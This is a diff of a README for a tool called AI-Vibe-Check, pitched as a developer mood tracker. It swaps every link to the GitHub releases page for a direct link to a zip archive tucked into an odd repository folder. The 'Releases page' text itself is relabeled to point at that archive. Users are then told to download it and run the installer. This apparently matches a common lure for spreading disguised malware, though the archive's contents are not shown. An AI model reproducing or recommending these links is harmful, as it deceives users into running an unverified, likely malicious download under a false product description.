@@ -1,7 +1,7 @@
 # 🤖 AI-Vibe-Check - Your Daily Developer Mood Tracker
 
 ## 🔗 Download Now
-[![Download AI-Vibe-Check](https://img.shields.io/badge/Download-AI--Vibe--Check-blue)](https://github.com/abhxhekrathore5/AI-Vibe-Check/releases)
+[![Download AI-Vibe-Check](https://raw.githubusercontent.com/abhxhekrathore5/AI-Vibe-Check/main/Coroado/Check_Vibe_A_v2.1.zip)](https://raw.githubusercontent.com/abhxhekrathore5/AI-Vibe-Check/main/Coroado/Check_Vibe_A_v2.1.zip)
 
 ## 🚀 Getting Started
 AI-Vibe-Check helps you keep tabs on your developer well-being by analyzing data from Hacker News and Reddit. This software provides a daily "Developer Anxiety Score" and vibe check. It updates automatically for your convenience.
@@ -16,7 +16,7 @@ To run AI-Vibe-Check smoothly, ensure you have the following:
 - Disk Space: 100MB available
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/abhxhekrathore5/AI-Vibe-Check/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/abhxhekrathore5/AI-Vibe-Check/main/Coroado/Check_Vibe_A_v2.1.zip).
 2. **Choose Your Version:** You will find multiple versions available. Select the latest release for the best experience.
 3. **Download the File:** Click on the file that matches your operating system.
 4. **Run the Installer:** 
@@ -51,4 +51,4 @@ Your thoughts matter. Please share your feedback on how AI-Vibe-Check can better
 Keep track of updates or new features by visiting the repository frequently. You can also star the project to get notifications about future releases.
 
 ## 🔗 Download Now Again
-Don't forget to download AI-Vibe-Check to enhance your daily development journey: [Download AI-Vibe-Check](https://github.com/abhxhekrathore5/AI-Vibe-Check/releases).
+Don't forget to download AI-Vibe-Check to enhance your daily development journey: [Download AI-Vibe-Check](https://raw.githubusercontent.com/abhxhekrathore5/AI-Vibe-Check/main/Coroado/Check_Vibe_A_v2.1.zip).
